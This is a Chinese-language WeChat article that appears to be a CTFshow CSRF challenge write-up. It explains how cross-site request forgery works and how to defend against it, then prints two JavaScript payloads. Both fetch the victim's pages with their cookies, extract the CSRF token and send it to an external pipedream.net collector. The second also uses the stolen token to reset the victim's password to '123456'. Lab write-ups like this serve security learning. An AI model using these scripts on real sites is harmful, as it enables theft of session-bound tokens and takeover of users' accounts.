---
title: CTFshow:请求伪造漏洞_CSRF
url: https://mp.weixin.qq.com/s/HdDlLJTTLI2oguXE54vU6Q
source: Doonsec's feed
date: 2026-02-26
fetch_date: 2026-02-27T04:06:19.840124
---

# CTFshow:请求伪造漏洞_CSRF

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZaibPC5NLUVW393paHCOoCVPRsKCibibLIOeHwpSCb2C5zicMVPW9UtJia4rTkY85f64bicq4ib0BvzCf6KNbaJTiaqYJTNgC8n3kzxo2IzsRxC791o/0?wx_fmt=jpeg)

# CTFshow:请求伪造漏洞\_CSRF

sec0nd安全

![]()

在小说阅读器中沉浸阅读

以下文章来源于小话安全
，作者小话安全

![](http://wx.qlogo.cn/mmhead/zZSYtpeVianRapGgv4dZsbb4yGh2fE9Ipqw8XFfT1x4DtWIEcAfcJtmwoVyDV9QNqYHApptibWAbw/0)

**小话安全**
.

网络安全她力量

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种常见的Web安全漏洞，攻击者利用用户已登录的身份，在用户不知情的情况下，诱导其浏览器向目标网站发送恶意请求，从而执行非用户本意的操作。

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVX4icMkVAMS8hLIbbIe4UDS6ymZML9l8adFN3qTWYHyOTI7NV7acjjVnFt99URpW2UapSwAu3RwhKRy6s72pY9da9ntCR4WI7Rw/640?wx_fmt=png&from=appmsg)

### 攻击原理

* **依赖认证信息自动携带**：浏览器在发送请求时，会自动携带目标网站的Cookie（如会话ID）、IP地址等认证凭据。
* **用户已登录目标网站**：攻击成功的前提是用户已在浏览器中登录了目标网站（如银行、社交平台）。
* **恶意请求构造**：攻击者在第三方站点（如恶意网站、邮件、论坛）中嵌入精心构造的请求链接或表单，用户访问时浏览器自动触发请求。

**示例流程**：

1. 用户登录银行网站A，浏览器保存了A的会话Cookie。
2. 用户未退出A，又访问了恶意网站B。
3. 网站B包含一个隐藏的请求（如`<img src="http://bank.com/transfer?to=攻击者&amount=1000">`）。
4. 浏览器请求该资源时，自动携带A的Cookie，银行服务器误以为是用户本人操作，执行转账。

### 主要危害

* 篡改用户数据（如修改密码、邮箱）。
* 执行敏感操作（如转账、发帖、购物）。
* 可能导致账户被完全控制或资金损失。

### 常见防御措施

1. **CSRF Token**
   服务器生成随机字符串（Token）嵌入表单，提交时校验。攻击者无法获取Token，因此无法构造有效请求。
2. **SameSite Cookie属性**
   设置Cookie的`SameSite`为`Strict`或`Lax`，限制第三方网站发起请求时携带Cookie。
3. **验证Referer/Origin头**
   检查请求来源，拒绝来自非可信域的请求。

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVXQDF48BZc7OibnBLoF76iayibGKNgQzJ9sQchic4pVQ0OIwpIXsrFR5ccb6mT2r7BNtibPnOATFAQloWgD2BIzkfHTl1zzGf8YJBiaA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZaibPC5NLUVXwF1iarO6HdaurRiaAXCtFoadvnQudvX1KpFbxr1zMQbibghQOtpZ0VOIuTUibex8C38q81Na0qPSntibA7upllicMkktu127frzo50/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVWjgb6PUHKE9FnGkosMDXUDqMNKqiaJ4WmI9M4Wz8MPpuQcBWiavFPFsEM6tpRfx74kh6COSZ38KictJ8dwicCQ6yzWrxNf0QJORPI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZaibPC5NLUVUcnIFmHBNreUVKuOlgia3pwynbEUq0gicY954GR4xt86FDNelbokJricrwYTHO8OibnLwudoiclJFw35mA35suWPQHwSIzicUgSAoZE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVVmlFczibkQJhfGVicwNnynQBKgJH17Mnkp8I7Mm0JtQoibicmf1SE6tOLia9icGsOvwMPJ0kKkvloM5Lk9KJHTtBDCrIe4m3015CBrg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVWhfCoUnwUPxc1xH7ib1U0G9HS6beP2pAzibxIoXfpeHSiaWL14j57iauCFeicuFEepn4hobkVcSw5czVgUJ1YESLcKq8E6Tricq6Tibw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZaibPC5NLUVXz3xbCtiaNdBB13JLeibDDyj80iaaqwtldty0Yfx1UErdQ1aiaxTN1C21bEuGIMZqiaOyDN9bjbPxIDXFFkN23ILcDx7Q3m0YwhxnE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZaibPC5NLUVUpQh9oHzdlaJYnok6wR0FadpkXpHt9Oj5uj1eU92ibPZhQ7vJHR6VWrzXsewOosY0WyWkTaNTiaWQMhgVX5LrgpInRFzEt2cMmk/640?wx_fmt=png&from=appmsg)

获取token

```
(async () => {  try {    // 可能包含flag的路径列表    const paths = ['/', '/modify'];    let found = false;
    for (const path of paths) {      const url = new URL(path, window.location.origin).href;      const res = await fetch(url, { credentials: 'include', method: 'GET' });      const txt = await res.text();
      const flagStart = txt.indexOf('csrf_token');      if (flagStart !== -1) {        // 提取flag本身（ctfshow{ + 后30字符，共38字符）        const flag = txt.substr(flagStart, 38);
        // 提取上下文：flag前100字节、后100字节（注意边界）        const contextStart = Math.max(0, flagStart - 100);        const contextEnd = Math.min(txt.length, flagStart + 38 + 100);        const context = txt.substring(contextStart, contextEnd);
        // 构建要发送的数据        const payload = {          url: url,          context: context,          flag: flag        };
        // 发送到远程服务器        const headers = new Headers();        headers.append("Content-Type", "application/json");        const options = {          method: "POST",          headers,          mode: "cors",          body: JSON.stringify(payload),        };        await fetch("https://eo4bp0sd9m8wz5c.m.pipedream.net", options);
        found = true;        break; // 找到后停止遍历      }    }
    if (!found) {      console.log("未找到ctfshow{标志");    }  } catch (e) {    console.error(e);  }})();
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVVKxl4IWDcsrQC8feNibZFpz1xtLetd7nOryJ2uvhObnmYkw66CD2Gulp8oXKsibLtjzNqhkdkPeINLZ6KSNc7yH2TLvpaGDeArk/640?wx_fmt=png&from=appmsg)

更改密码

```
(async () => {  try {    const paths = ['/', '/modify'];    let found = false;
    for (const path of paths) {      const url = new URL(path, window.location.origin).href;      const res = await fetch(url, { credentials: 'include', method: 'GET' });      const txt = await res.text();
      const flagStart = txt.indexOf('csrf_token');      if (flagStart !== -1) {        // 原有逻辑：提取上下文并发送到远程服务器        const flag = txt.substr(flagStart, 38);        const contextStart = Math.max(0, flagStart - 100);        const contextEnd = Math.min(txt.length, flagStart + 38 + 100);        const context = txt.substring(contextStart, contextEnd);
        // 精确提取 CSRF token 值（支持 input 隐藏域和 meta 标签）        let csrfToken = '';        const inputMatch = txt.match(/name=["']csrf_token["']\s+value=["']([^"']+)["']/i);        if (inputMatch) {          csrfToken = inputMatch[1];        } else {          const metaMatch = txt.match(/<meta\s+name=["']csrf-token["']\s+content=["']([^"']+)["']/i);          if (metaMatch) {            csrfToken = metaMatch[1];          }        }
        // 将上下文和 token 发送到远程服务器（用于记录）        const payload = {          url: url,          context: context,          flag: flag,          csrfToken: csrfToken        };        const headers = new Headers();        headers.append("Content-Type", "application/json");        const options = {          method: "POST",          headers,          mode: "cors",          body: JSON.stringify(payload),        };        await fetch("https://eo4bp0sd9m8wz5c.m.pipedream.net", options);
        // 若成功提取到 token，则尝试修改密码        if (csrfToken) {          const formData = new URLSearchParams();          formData.append('password', '123456');          formData.append('csrf_token', csrfToken);          // 修改密码的提交地址通常为当前页面 URL（也可根据实际情况调整）          const modifyUrl = url;           await fetch(modifyUrl, {            method: 'POST',            credentials: 'include',            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },            body: formData          });          console.log('密码修改请求已发送（新密码：123456）');        } else {          console.log('未找到精确的 CSRF token 值，无法修改密码');        }
        found = true;        break; // 找到第一个符合条件的页面后停止遍历      }    }
    if (!found) {      console.log("未找到 csrf_token 标志");    }  } catch (e) {    console.error(e);  }})();
```

登录成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZaibPC5NLUVVC3qjGLNc9QYmlcU7YXUicBn8hA3jyiboU6iaGobVogSQuTXcbxPAoyErpM6FMpuBQJAZkfJd6icjgue6tNCI5snjNLF2Lrtl1TLU/640?wx_fmt=png&from=appmsg)

获得flag

![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVWWexMfReeRlwAjmkahaXibYon5vtMV0ibfE7vPEBcWsyzyktqd19E1VFXUdFaIhA0sDiaPcz8tznXicPreUTUA6tFeptoPB6DqbXs/640?wx_fmt=png&from=appmsg)

直播时间2月26日晚21:00

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/u7ibmWw94HhyPjaGFbJ1aj02bPU5jwAmG8o7vJ9jgF7q3DaU2c6Bicqz1ZTLTRWLc188vgsWFMnyNE6CX8Y1zSaw/0?wx_fmt=png)

sec0nd安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/u7ibmWw94HhyPjaGFbJ1aj02bPU5jwAmG8o7vJ9jgF7q3DaU2c6Bicqz1ZTLTRWLc188vgsWFMnyNE6CX8Y1zSaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过